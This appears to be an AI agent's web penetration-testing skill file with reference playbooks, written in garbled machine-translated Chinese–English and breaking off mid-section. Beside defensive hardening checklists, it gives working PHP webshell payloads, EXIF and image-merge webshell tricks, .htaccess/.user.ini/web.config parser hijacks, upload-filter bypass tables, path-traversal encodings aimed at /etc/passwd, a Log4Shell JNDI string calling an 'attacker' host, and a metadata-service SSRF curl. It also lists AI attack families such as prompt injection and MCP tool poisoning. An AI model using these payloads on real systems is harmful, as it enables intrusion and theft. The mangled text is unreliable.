# stage: recon
# category: specialized

> Webhighlevel/gradesecurityTest — Injectattack族、Protocolsecurity、Authenticationand/withlogicvulnerability、Fileand/withdeploymentsecurity、presentgeneration/proxyWebAttack Surface，contain/include completewhole/integerPlaybook

# Web highlevel/gradesecurityTest Skill

whengoal/targetis Web should use、API、GatewayorBrowser面 to/towardsService，且needsystemproperty/nature's/ofvulnerabilityTesttimeusethis Skill。

** before/frontplacecondition**：like/such as resultrequest仍 by/fromClientcontrol且Replayun-稳define， firstuse `client-reverse` Skill。

## CTF scenarioRoute

> whengoal/targetfor/is CTF challenge（Knownhas/have flag，needbypassspecificFilter）time，advantage firstuse `ctf-web` Skill Getspecific bypass valuesand payload：

| CTF scenario | Route to ctf-web | reference document |
|---------|---------------|---------|
| PHP weak comparison/typebypass | `ctf-web` | `references/php-bypass-cheatsheet.md` |
| Command Injectionemptyformat/gridbypass | `ctf-web` | `references/command-injection-bypass.md` |
| eval returnshow/display/no/withoutreturnshow/display | `ctf-web` | `references/eval-and-rce-techniques.md` |
| PHP code audit | `ctf-web` | `references/php-code-audit-checklist.md` |
| SSTI injection chain | `ctf-web` | `references/ssti-injection-chains.md` |
| Deserialization Gadget Chain | `ctf-web` | `references/deserialization-playbook.md` |
| FileUpload → RCE | this Skill | `references/web-playbook-08-file-vulnerabilities.md` |

**this Skill side re-/heavypenetrationTestmethodology**，CTF solid战bypassvalueand payload template请reference `ctf-web`。

## scenarioRoute

| Attack Surfacetype | preferredreference |
|-----------|---------|
| parameterInject（SQLi/XSS/commandExecute/SSTI/XXE） | `references/web-injection.md` |
| Protocolsecurity（CORS/GraphQL/WebSocket/OAuth/requestwalk私） | `references/web-modern-protocols.md` |
| Authenticationand/withlogic（IDOR/exceedright/支付/Password Reset/authenticationbypass） | `references/web-logic-auth.md` |
| Fileand/withfoundation/basisset up施（Upload/traverse/iterate/includes/contains/deployment/cache/CDN/云） | `references/web-file-infra.md` |
| deploymentsecurity | `references/web-deployment-security.md` |

## Testprocess

### 1. Input ValidationTest
- SQL Inject：布尔/time/报wrong/Union/Heap叠
- XSS：negative/reverse射/store/DOM/CSP bypass
- Command Injection： part/point隔symbol/characterbypass、Encodingbypass
- SSTI：templatelead/guide擎identify + RCE chain
- XXE：solidbodyInject、OOB dataoutbring/carry
- Deserialization：Java/PHP/Python chain

### 2. Authenticationand/withSessionTest
- defaultCredential、brute force cracking
- Session Managementdefect/flaw（fixed/Hijack/insecure Cookie）
- JWT security（AlgorithmTamper/Keybrute force/noneAlgorithm）
- OAuth/OIDC configurationdefect/flaw
- MFA bypass

### 3. logicvulnerabilityTest
- Privilege Escalation（水平/垂direct）
- 业务logicbypass（支付/Coupon/投票）
- 竞态condition
- IDOR（insecuredirectreceive/connect for/to象citation）

### 4. ProtocolsecurityTest
- CORS configurationerror/mistake
- GraphQL inner/inside省/Inject
- WebSocket Authenticationand/withInject
- HTTP requestwalk私
- SSRF（intranet/internal networkdetect/probe/云Metadata）

### 5. Fileand/withdeploymentsecurity
- FileUploadbypass
- Pathpenetrateexceed
- LFI/RFI
- CDN/cache投毒
- Supply Chain Attack
- 云Security Configuration

## reference document

- `references/web-injection.md` — Injectattack详finereference
- `references/web-modern-protocols.md` — presentgeneration/proxyProtocolsecurity
- `references/web-logic-auth.md` — Authenticationand/withlogicvulnerability
- `references/web-file-infra.md` — Fileand/withfoundation/basisset up施security
- `references/web-deployment-security.md` — deploymentsecurity
- `references/web-ai-attack-map.md` — Web and/with AI attackMap
- `references/web-playbook-*.md` — each专item Playbook（23  (counter)）

## References — web-ai-attack-map

# Web And AI Attack Map

Use the fused upstream material for complete content:

- `references/`
- `references/web-playbook-*.md`
- `references/tools-reference-*.md`

## Web Families

- SQL and NoSQL injection
- XSS
- SSRF
- RCE
- XXE
- SSTI
- LFI and RFI
- CSRF
- JWT and auth flaws
- API and business logic flaws
- request smuggling
- cache and CDN issues
- WebSocket issues

## AI And MCP Families

- prompt injection
- indirect prompt injection
- CoT interference
- MCP tool poisoning
- hidden instruction injection
- agent privilege abuse
- prompt leakage

## References — web-deployment-security

# Webdeploymentand/with供shouldchainsecurity

> **comeSource**: based onWooYunvulnerabilityLibrarysolid战经验 + 云securityBest Practice + OWASP供shouldchainsecurityguiderefine
> **methodology**: WooYunvulnerabilitythis质公 style/mode + L1-L4system-izeAnalysis
> **相 close/shut**: AIshould usecontainerescape/evasionTest → [ai-baseline-security.md](ai-baseline-security.md)

---

## one、供shouldchainand/withComponentsecurity

### 1.1 vulnerabilitythis质

```
供shouldchainrisk = No.threedirectioncodetrust × transmitpassproperty/naturedepend ondeepdegree/measure × Update滞 after/back
```

should usemiddle/center 70-90% 's/ofcodefrom openSourceComponent，one (counter)highdangerComponentvulnerabilitycanimpactnumberten thousanditemeye/look（like/such as Log4Shell、Polyfill.io）。

### 1.2 Frontend供shouldchain

**npm/yarn depend onrisk**

| attacktype | explanation | 典 typecase |
|----------|------|----------|
| maliciousPackage | name相似's/ofmaliciousPackage(typosquatting) | `crossenv` 窃take/getenvironmentvariable |
| original type污染 | `lodash`/`jQuery` original typechain污染 | CVE-2019-10744 |
| depend onHijack | maintain者accountby (passive)receive/connect管 after/back植enterBackdoor | `event-stream` 挖矿 |
| CDN投毒 | 公together/shareCDNhost's/ofJSby (passive)Tamper | Polyfill.ioSupply Chain Attack |
| buildInject | package.json scripts钩子Executemaliciouscommand | `postinstall` footthisattack |

**detectionmethod**

```bash
# AuditKnownvulnerability
npm audit
yarn audit

# Inspect/Check past/excessivetimedepend on
npm outdated

# viewdepend onTreedeepdegree/measure
npm ls --all | head -100

# Inspect/Checkcan疑's/ofInstallationfootthis
npm pack --dry-run  # viewwill/shallneed toInstallation's/ofFile
cat node_modules/<pkg>/package.json | grep -A5 '"scripts"'
```

### 1.3 Backend供shouldchain

**Python/pip**

```bash
# KnownvulnerabilityAudit
pip-audit
safety check

# viewdepend on
pip list --outdated
pipdeptree  # canlook-izedepend onTree
```

**Java/Maven**

```bash
# OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# viewdepend onTree
mvn dependency:tree
```

**commonhighdangerComponentvulnerabilityquick reference**

| Component | CVE | impact | detection |
|------|-----|------|------|
| Log4j2 | CVE-2021-44228 | RCE | `${jndi:ldap://attacker/}` |
| Spring4Shell | CVE-2022-22965 | RCE | Spring Framework < 5.3.18 |
| FastJSON | CVE-2022-25845 | RCE | autoTypeDeserialization |
| Apache Struts2 | CVE-2017-5638 | RCE | Content-TypeInject |
| Jackson | CVE-2019-12384 | RCE | multi/multiple态Deserialization |
| Commons-Collections | CVE-2015-6420 | RCE | JavaDeserializationchain |
| jQuery | CVE-2020-11022 | XSS | < 3.5.0 HTMLInject |
| Lodash | CVE-2021-23337 | RCE | Template Injection |

### 1.4 DockerMirror/Image供shouldchain

```bash
# Mirror/ImagevulnerabilityScanning
trivy image <image:tag>
grype <image:tag>

# Inspect/Checkfoundation/basisMirror/Image
docker inspect <image> | grep -i "rootfs\|created\|author"

# viewMirror/Imagelayerhistorical(discoverhide/concealFile/Key)
docker history --no-trunc <image>
```

**riskpoint**：
- use `latest` tag/labelrather than fixedversion
- foundation/basisMirror/Image past/excessivelarge(includes/containsnot必need totoollike/such asgcc/curl)
- Dockerfilemiddle/centerhardEncodingKey/Credential
-  with/byrootuserRuncontainer

### 1.5 SCAtoolRecommendation

| tool |  language speech/language/scenario | characteristic |
|------|-----------|------|
| `npm audit` / `yarn audit` | JavaScript | inner/insideplace,免费 |
| `pip-audit` / `safety` | Python | 免费 |
| OWASP Dependency-Check | Java/.NET |  openSource,supportsmulti/multiple language speech/language |
| Snyk | all/full language speech/language | SaaS,mostall/fullvulnerabilityLibrary |
| Trivy | container/IaC/SBOM |  openSource,speed/fastdegree/measurefast |
| Grype | containerMirror/Image |  openSource,Anchoreexit品 |
| Renovate / Dependabot | AutomaticUpgrade | GitHubintegrated |

### 1.6 SBOM(software物料clearsingle)

```bash
# generate SBOM (CycloneDXformat)
cyclonedx-npm --output sbom.json            # Node.js
cyclonedx-py --format json -o sbom.json      # Python
mvn org.cyclonedx:cyclonedx-maven-plugin:makeBom  # Java

# generate SBOM (SPDXformat)
syft <image> -o spdx-json > sbom.spdx.json   # containerMirror/Image
```

SBOM  use途：combine规Audit、Permission证combine规、vulnerabilitytrace、供shouldchaintransparency。

### 1.7 defensemeasure

- **lockversion**: use `package-lock.json` / `Pipfile.lock` / `pom.xml` fixedversion
- **mostsmalldepend on**: regularCleanupun-usedepend on，Avoidtransmitpassproperty/naturedepend on膨胀
- **CIintegrated**: at/inCI/CDmiddle/centerjoinSCAScanning，vulnerability阻break/judgebuild
- **Private仓Library**: useNexus/VerdaccioProxy，Avoiddirectreceive/connectPull公together/share仓Library
- **SignatureValidate**: npmsupports`npm audit signatures`ValidatePackageSignature
- **regularUpdate**: settingDependabot/RenovateAutomaticCreateUpgradePR

---

## two、云deploymentand/withServersecurity

### 2.1 riskthis质

```
deploymentrisk = defaultconfigurationtrust × Expose面积 × 运维sparse忽
```

should usecodesecuritynotetc. at/insystemsecurity。deploymentenvironment's/oferror/mistakeconfiguration to/towards to/towardsisAttackermost firstexploit's/of突破口。

### 2.2 ServerhardeningInspect/Check

**Portand/withService**

```bash
# Scanning openrelease/putPort
nmap -sV -p- <target>

# highdangerPortquick reference
# 22(SSH) 3306(MySQL) 6379(Redis) 27017(MongoDB) 9200(Elasticsearch)
# 8080(Tomcat) 8443(manage) 2375(Docker API) 10250(Kubelet)
```

| Inspect/Checkitem | Security Configuration | risk |
|--------|----------|------|
| SSH | Disablerootlogin、KeyAuthentication、non-22Port | brute force cracking |
| DatabasePort | onlyBind127.0.0.1/intranet/internal networkIP | Unauthorized Access |
| Redis | settingPassword、Disableinternet/external network、renamedanger险command | RCE(writewebshell/crontab/ssh) |
| MongoDB | EnableAuthentication、Bindintranet/internal network | dataLeak/Disclosure |
| Docker API | BindUnix Socket、EnableTLS | containerescape/evasion/RCE |
| Elasticsearch | X-PackAuthentication、Disableinternet/external network | dataLeak/Disclosure |
| Kubernetes API | RBAC、networkstrategy、AuditLog | clusterreceive/connect管 |

**Operating Systemhardening**

```bash
# LinuxhardeningInspect/Check
cat /etc/ssh/sshd_config | grep -E "PermitRootLogin|PasswordAuth|Port"
cat /etc/passwd | grep ':0:'          # non- method/lawrootuser
find / -perm -4000 2>/dev/null        # SUIDFile
crontab -l                            # scheduledTaskBackdoor
last -20                              # mostnearloginLog/Record
ss -tlnp                              # ListenPort
iptables -L -n                        # Firewallrule
```

### 2.3 TLS/SSL/HTTPS configuration

**Testmethod**

```bash
# SSL/TLSconfigurationInspect/Check
nmap --script ssl-enum-ciphers -p 443 <target>
testssl.sh <target>
sslyze <target>

# onlineInspect/Check
# https://www.ssllabs.com/ssltest/
```

**commonissue/problem**

| issue/problem | risk | repair/fix |
|------|------|------|
| TLS 1.0/1.1 un-Disable | BEAST/POODLEattack | onlyEnableTLS 1.2+ |
| weakPasswordset (classifier)(RC4/DES/MD5) | Downgradeattack | useAES-GCM/ChaCha20 |
| Certificate past/excessive期/自Signature | middle人attack | useLet's Encrypt/CACertificate |
| missingHSTShead/top | SSL Strip | `Strict-Transport-Security: max-age=31536000` |
| mixcombinecontent(HTTP+HTTPS) | contentHijack | all/fullstandHTTPS+CSP |

**NginxSecurity Configurationreference**

```nginx
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Content-Type-Options nosniff;
    add_header X-Frame-Options DENY;
    add_header X-XSS-Protection "1; mode=block";
    add_header Content-Security-Policy "default-src 'self'";
    add_header Referrer-Policy strict-origin-when-cross-origin;
    
    # hide/concealversion
    server_tokens off;
    
    # ProhibitDirectorycolumntable
    autoindex off;
}
```

### 2.4 云Servicesecurity

**general/universal云risk (AWS/Azure/GCP/阿in云)**

| risk | detectionmethod | impact |
|------|----------|------|
| S3/OSS桶Public | `aws s3 ls s3://bucket --no-sign-request` | dataLeak/Disclosure |
| IAMPermission past/excessivewide | Inspect/Check`*`commonmatchsymbol/characterstrategy | Privilege Escalation |
| Security Groupall/full open | Inspect/Check`0.0.0.0/0`inboundrule | ExposeInternalService |
| KeyhardEncoding | `trufflehog`/`gitleaks` Scanningcode仓Library | accountreceive/connect管 |
| MetadataService | `curl http://169.254.169.254/` (SSRFexploit) | Credential窃take/get |
| Logun-Enable/On | CloudTrail/ActionTrailAudit | cannot溯Source |

**PaaSplatformrisk (Railway/Vercel/Heroku/Netlify)**

| risk | explanation | detection |
|------|------|------|
| environmentvariableLeak/Disclosure | buildLog/error/mistakepageExposeENV | viewPublicbuildLog |
| Domain Namereceive/connect管 | CNAMEpoints toalreadyDelete's/ofPaaSshould use | `dig CNAME <domain>` Inspect/Check悬挂Log/Record |
| together/shareenjoyRuntimeescape/evasion | multi/multiple租user/accountcontainerbetweenisolationnot足 | detect/probesame/together sectionpointService |
| deploymentCredentialLeak/Disclosure | API Tokenat/inCIconfigurationmiddle/centerPlaintext | ReviewCI/CDconfigurationFile |
| functionInject | Serverlessfunction's/ofeventInject | Testeventparametercancontrolproperty/nature |

**云KeyLeak/Disclosuredetection**

```bash
# code仓LibraryScanning
gitleaks detect --source=. --verbose
trufflehog git https://github.com/org/repo

# commonLeak/Disclosurelocation
.env / .env.production / .env.local
docker-compose.yml
CIconfiguration: .github/workflows/*.yml / .gitlab-ci.yml / Jenkinsfile
Frontendcode: next.config.js / .env.NEXT_PUBLIC_*
```

### 2.5 containerand/withorchestrationsecurity

> **AIshould usecontainerescape/evasion**: 针 for/toAI Agent/LLMdeploymentenvironment's/ofcontainerescape/evasionTestmethodology → [ai-baseline-security.md](ai-baseline-security.md) §twoten

**DockersecurityInspect/Check**

```bash
# container with/bynon-rootRun
docker inspect <container> | grep '"User"'

# Inspect/Checkprivilegepattern
docker inspect <container> | grep '"Privileged"'

# Inspect/CheckMount(SensitiveDirectory)
docker inspect <container> | grep -A10 '"Mounts"'

# Inspect/CheckCapabilities
docker inspect <container> | grep -A20 '"CapAdd"'
```

**KubernetessecurityInspect/Check**

```bash
# RBACAudit
kubectl auth can-i --list --as=system:serviceaccount:default:default
kubectl get clusterrolebinding -o wide

# Podsecurity
kubectl get pods -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.securityContext}{"\n"}{end}'

# SecretPlaintextInspect/Check
kubectl get secrets -o yaml | grep -i "password\|token\|key"

# networkstrategy
kubectl get networkpolicy -A
```

### 2.6 CI/CDStream水线security

| risk | explanation | defense |
|------|------|------|
| KeyPlaintextstore | Pipelineconfigurationmiddle/centerhardEncodingKey | useVault/Sealed Secrets |
| depend onnotcanmessage | CImiddle/centerPullun-Validate's/ofBuild Tool | lockCIMirror/Imageversion |
| buildInject | PRmiddle/centerModifyCIconfigurationExecutemaliciouscode | Fork PR需approval after/backjustcantriggerCI |
| make/control品Tamper | buildproduce物un-Signature | Cosign/NotarySignature |
| Permission past/excessivewide | CI Tokenownhas/havemanagememberPermission | mostsmallPermissionToken |

### 2.7 deploymentsecurityChecklist

**Server**
- [ ] SSHKeylogin,DisablePasswordandroot
- [ ] Firewallonly openrelease/put必need toPort(80/443)
- [ ] Database/cacheonlyListenintranet/internal network
- [ ] regularUpdateOSandmiddle (classifier)Patch
- [ ] EnableAuditLogandintrusion/breachdetection

**HTTPS**
- [ ] TLS 1.2+ 且DisableweakPasswordset (classifier)
- [ ] HSTShead/top + CAA Record
- [ ] CertificateAutomatic续期(Let's Encrypt)

**云Service**
- [ ] IAMmostsmallPermission + MFA
- [ ] store桶Private + Encryption
- [ ] Security GrouplimitationcomeSourceIP
- [ ] CloudTrail/AuditLogEnable
- [ ] Keyvia/throughKMS/Vaultmanage,nothardEncoding

**container**
- [ ] non-rootuserRun
- [ ]  (classifier)读File System
- [ ] no/withoutprivilegepattern + mostsmallCapabilities
- [ ] Mirror/ImageScanning(Trivy/Grype)
- [ ] networkstrategyisolationPodbetweencommonmessage

**CI/CD**
- [ ] Keyvia/throughSecretmanage,notat/inconfigurationFilemiddle/center
- [ ] SCAScanningintegrated tobuildStream水线
- [ ] make/control品SignatureValidate
- [ ] Fork PRapproval after/backjusttriggerbuild

---

## three、general/universalWebFrameworkCVEdetectionmethodology

> 适used for/for Next.js、Spring Boot、Django、Rails、Express、Laravel etc.anyWebFramework's/ofKnownCVEdetectionand/withexploitValidate

### 3.1 FrameworkFingerprintidentify

**Automatic-izeFingerprintcollect**

| FingerprintcomeSource | detectionmethod | informationextract |
|----------|----------|----------|
| HTTPresponsehead/top | Inspect/Check`X-Powered-By`、`Server`、`X-Framework` | Frameworknameandversion |
| Cookiename | `JSESSIONID`(Java), `laravel_session`(Laravel), `_next`(Next.js) | Frameworktype |
| defaulterror/mistakepage | trigger404/500，Analysispagespecial征、样 style/mode、文案 | Framework+Debugpattern |
| staticresourceSourcePath | `/_next/`(Next.js), `/static/`(Django), `/assets/`(Rails) | Framework+Build Tool |
| JSFilecontent | Search`webpack`/`vite`/`turbopack`identifier、Frameworkversionstring | exactversionnumber |
| Source Map | Access`*.js.map`Inspect/Checkisno/notLeak/Disclosure、AnalysisimportPath | Framework+depend onLibrary completewhole/integercolumntable |
| 元tag/label/comment | HTMLmiddle/center's/of`<meta name="generator">`、buildcomment | Frameworkversion |
| package.jsonLeak/Disclosure | Access`/package.json`、`/composer.json`、`/Gemfile.lock` | alldepend on及exactversion |

```
Fingerprintidentifyprocess:
1. Passivegather → responsehead/top、Cookie、HTML、JSAnalysis
2. Activedetect/probe → defaultPath、error/mistaketrigger、configurationFileAccess
3. versionlock → exact tomainversion. next/timeversion.Patchversion
4. CVEMatch → NVD/Snyk/GitHub Advisory query
```

### 3.2 CVE检索and/withPoCValidate

**CVEdataSource**

| dataSource | URL | characteristic |
|--------|-----|------|
| NVD | nvd.nist.gov | 官directionCVELibrary，CVSSassess part/point |
| GitHub Advisory | github.com/advisories |  openSourceitemeye/lookvulnerability，contain/includePoClink |
| Snyk | snyk.io/vuln | depend onlevel/gradeexactMatch |
| Exploit-DB | exploit-db.com | alreadyValidatePoCandEXP |
| PacketStorm | packetstormsecurity.com | security公告andexploitcode |
| FrameworkChangeLog | Framework官directionRelease Notes | securityrepair/fixfine section |

**general/universalCVEValidateprocess**

```
1. version比 for/to
   Acknowledgmentversionnumber → 查CVEImpact Scope(affected versions) → Acknowledgmentisno/notat/inImpact Scopeinner/inside

2. PoC repeatpresent
   a. SearchPublicPoC (GitHub/Exploit-DB/security博客)
   b.  principle/logicuntie/solvevulnerabilityoriginal principle/logic(Patchdiffismost佳resource料)
   c. at/inTestenvironmentconstructrequestValidate
   d. Note: generate/liveproduceenvironmentonlyValidatetriggercondition,notExecute破badproperty/naturePayload

3. PatchAnalysis(L4defensenegative/reverse推)
   a. comparisonrepair/fix before/front after/backcodediff →  principle/logicuntie/solverepair/fix(past tense)what
   b. negative/reverse推: repair/fix before/front's/ofprocess/handlelogicmiddle/centerwhereexistat/indefect/flaw
   c. thinktest: repair/fixisno/not completewhole/integer?isno/notexistat/inbypassrepair/fix's/ofcancan?
```

### 3.3 commonFrameworkAttack Surfaceclassification

| Attack Surfacetype | general/universaldetectionmethod | 典 typevulnerabilitypattern |
|-----------|-------------|-------------|
| **Route/middle (classifier)bypass** | Pathspecification-izeTest: `//path`、`/./path`、`/%2e/path`、largesmallwrite变body、specialRequest HeaderForge | Authenticationbypass、authenticationskips |
| **template/渲染Inject** | at/inparametermiddle/centerInjecttemplate language method/law: `{{7*7}}`(Jinja2), `${7*7}`(Thymeleaf), `<%= 7*7 %>`(ERB) | SSTI→RCE |
| **Deserialization** | identifySerializationformat(`ac ed 00 05`/`O:`/`rO0AB`), SendmaliciousSerializationdata | Java/PHP/PythonDeserializationRCE |
| **Server Actions/RPC** | InterceptFrameworkspecialhas/have's/ofRPCcall/invoke,Analysisend(side)pointidentifier,directreceive/connectcall/invokebypassFrontendvalidate | CSRF、Input Validationbypass |
| **SSR/RSCInject** | Intercept并ModifyServiceend(side)渲染parameter(like/such as`_rsc`/`__data`/`loader`),constructExceptionPayload | Serviceend(side)codeExecute |
| **configurationFileLeak/Disclosure** | traverse/iteratecommonconfigurationPath: `.env`、`web.config`、`application.yml`、`settings.py` | Key/CredentialLeak/Disclosure |
| **Debugend(side)point** | Inspect/CheckFrameworkDebugpattern: `/debug`、`/_debug`、`/__inspect`、`/graphql`(introspection) | informationLeak/Disclosure→RCE |
| **original type污染(JS)** | JSONRequest Bodymiddle/centerInject`{"__proto__":{"isAdmin":true}}`or`{"constructor":{"prototype":{"x":1}}}` | Privilege Escalation、DoS |
| **cache投毒** | operate纵cacheKey相 close/shuthead/top(`X-Forwarded-Host`/`X-Original-URL`), Validateresponseisno/notby (passive)cache | store typeXSS、钓鱼 |

### 3.4 Frameworksecuritygeneral/universalChecklist

```
[ ] AcknowledgmentFramework及placehas/havedepend on's/ofexactversion
[ ] queryNVD/Snyk/GitHub Advisorycorresponds toCVE
[ ] Validateplacehas/havehighdangerCVE(CVSS≥7.0)isno/notalreadyrepair/fix
[ ] Source Mapisno/notalreadyDisable
[ ] Debugpatternisno/notalreadyDisable/Off
[ ] error/mistakepageisno/notLeak/DisclosureHeapStack/Path/version
[ ] defaultconfigurationFilePathisno/notcanAccess
[ ] middle (classifier)/Routeauthenticationisno/notcanvia/throughPath变bodybypass
[ ] APIend(side)pointisno/notallneedAuthentication(DeleteCookie/TokenTest)
[ ] securityresponsehead/topisno/not completewhole/integer(CSP/HSTS/X-Frame-Options/X-Content-Type-Options)
[ ] CSRFprotectionisno/not覆stampplacehas/havestatechangeoperation
[ ] Frameworkspecialhas/have's/ofRPC/Actionend(side)pointisno/nothas/haveindependentauthentication
```

---

*based onWooYunvulnerabilityLibrary(88,636 (classifier))refine + 云/供shouldchainsecurityBest Practice | only供security研究and/withdefensereference*

## References — web-file-infra

# WebFileand/withfoundation/basisset up施security

> **comeSource**: based onWooYunvulnerabilityLibrary88,636 (counter)truesolidvulnerabilitycaserefine，涵stampFileUpload(2,711例)、Filetraverse/iterate/Download(50例deepdegree/measureAnalysis)、informationLeak/Disclosure(7,337例)threelargeleaddomain。
> **methodology**: WooYunvulnerabilitythis质公 style/mode + INTJ style/modesystemAnalysisFramework

---

## one、File Upload Vulnerability

### 1.1 vulnerabilitythis质

```
attackchain: upload pointsdiscover → detectionbypass → PathGet → parsingexploit → WebshellRun
 become/successmerit率 = P(bypassdetection) × P(GetPath) × P(parsingRun)
```

core矛盾: meritcanrequirement(allowsUpload) vs securityrequirement(limitationExecute)。mostdefenseonly close/shutnote"bypassdetection"，ignoresPathLeak/Disclosureandparsingconfiguration。

### 1.2 upload pointsidentify

| upload pointstype | 频率 | risk | 典 typePath |
|-----------|------|------|---------|
| 富文thisediteditdevice | 42% | extremehigh | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| head/top像Upload | 18% | high | `/upload/avatar/`, `/member/uploadfile/` |
| attachment/document | 15% | high | `/uploads/`, `/attachment/` |
|  after/back (classifier for machines)meritcan | 12% | extremehigh | `/admin/upload/`, `/system/upload/` |
| Importmeritcan | 5% | high | `/import/`, `/excelUpload/` |

editeditdeviceTestPath:

| editeditdevice | TestPath | Uploadinterface |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 bypasstip/trick - Extension name

黑 namesinglebypassQuick Reference Table:

| tip/trick | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| largesmallwrite | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| doublewrite | `.pphphp` | `.asaspp` | `.jsjspp` |
| special after/back缀 | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| emptyformat/grid/point | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00截break/judge | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
|  part/pointnumber(IIS) | N/A | `.asp;.jpg` | N/A |
| 换row(Apache) | `.php\x0a` | N/A | N/A |

白 namesinglebypassmethod:

| technique | original principle/logic | condition |
|-----|------|------|
| parsingvulnerability | Upload白 namesingleFile但by (passive)specialparsing | IIS/Apache/Nginxvulnerability |
| Apachemulti/multiple after/back缀 | `shell.php.jpg` by (passive)parsingfor/isphp | Apachemulti/multiple after/back缀configuration |
| %00截break/judge | `shell.php%00.jpg` | PHP < 5.3.4 |
| configurationFileUpload | Upload`.htaccess`/`.user.ini` | allowstxt/configurationFile |
| Graph (classifier)马+LFI | UploadGraph (classifier)马with/combined withfile inclusion | existat/inLFIvulnerability |

### 1.4 bypasstip/trick - MIME/Content-Type

```
ModifyContent-Typefor/is with/bydescendvaluei.e.canbypass:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (general/universal)

BurpInterceptModifyexample:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <--  close/shutkeyModifypoint
```

### 1.5 bypasstip/trick - Filehead/top/contentdetection

commonFileMagic Number:

| type | Magic Number(Hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | no/withoutReadableASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

Graph (classifier)马make/control as/do:

```bash
# method1: simplesingleAddFilehead/top
GIF89a<?php system($_POST['cmd']); ?>

# method2: MergeFile
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# method3: EXIFInject
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 WebServerparsingvulnerability

```
IIS 5.x/6.0:
  Directoryparsing: /shell.asp/1.jpg     -> parsingfor/isASP
  Fileparsing: shell.asp;.jpg       -> parsingfor/isASP
  畸形parsing: shell.asp.jpg        -> cancanparsingfor/isASP

Apache:
  multi/multiple after/back缀: shell.php.xxx          ->  fromright to/towardsleftparsing
  .htaccess: AddType application/x-httpd-php .jpg
  换rowparsing: shell.php%0a         -> CVE-2017-15715

Nginx:
  畸形parsing: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  emptybyte: shell.jpg%00.php       -> 老versionvulnerability

Tomcat:
  PUTmethod: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 configurationFileHijackparsing

```apache
# .htaccess:  letjpgby (passive)parsingfor/isPHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): Automaticincludes/containsGraph (classifier)马
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS):  letjpgby (passive)FastCGIprocess/handle -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 Race Conditionexploit

```
original principle/logic: Upload after/backDeleteexistat/intimedifference
exploit: multi/multipleThreadUpload+Access,at/inDelete before/frontExecutemaliciouscode
tip/trick: maliciousFile firstgenerateone (counter)newFile tootherlocation,newFilenotby (passive)Cleanupmachinemake/controlDelete
```

### 1.9 defensemeasure

1. 白 namesingleValidate:  (classifier)allowsspecificExtension name(`.jpg .png .gif .pdf`)
2. multi/multiplelayerValidate: Extension name + MIME(finfo_file) + Filehead/top + getimagesize()
3. File re-/heavy命 name: `uniqid() + fixedExtension name`，彻bottomgo/leavedivideoriginalFile name
4. ProhibitExecute: UploadDirectoryProhibitfootthisExecutePermission
5. Permissionmostsmall-ize: `chmod 0644`，WebusernotcanExecute
6.  first检 after/backexist:  firstValidate againstore，useoriginal子operation防Race Condition
7. Pathhide/conceal: notreturns completewhole/integerPath，useCDNorfollowmachine-izeURL

---

## two、Filetraverse/iterateand/withfile inclusion

### 2.1 vulnerabilitythis质

```
userinputenteremptybetween -> [trustboundary/perimeterloss效] -> File Systememptybetween
core:  opensend/issue者recognizefor/is"userinputenter=File name"，Attackerexploit"userinputenter=Path指 make"
```

### 2.2 vulnerabilityparameteridentify

high频parameter name(press/according toexitpresent频率):

```
File category/class: filename, filepath, path, file, filePath, hdfile, inputFile
Download category/class: download, down, attachment, attach, doc
Read category/class: read, load, get, fetch, open, input
template category/class: template, tpl, page, include, temp
general/universal category/class: url, src, dir, folder, resource, name
```

highdangermeritcanpoint(TOP 5):
1. FileDownloadinterface (27 next/time) - `down.php, download.jsp`
2. File预viewmeritcan (17 next/time) - `view.php, preview.jsp`
3. attachmentmanage (6 next/time) - `attachment.php`
4. Graph (classifier)Load (5 next/time) - `pic.php, image.jsp`
5. Logview (4 next/time) - `log.php, viewlog.jsp`

### 2.3 Directorytraverse/iteratePayload

foundation/basistraverse/iterate:

```bash
../                          # Linuxstandard
..\..\                       # Windowsstandard
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Encodingbypass:

```bash
# URLsingle next/timeEncoding
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# URLdouble re-/heavyEncoding
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8supergrowEncoding (GlassFishspecialhas/have)
%c0%ae%c0%ae/%c0%af

# mixcombineEncoding
..%2f  |  %2e%2e/  |  ..%c0%af
```

specialbypass:

```bash
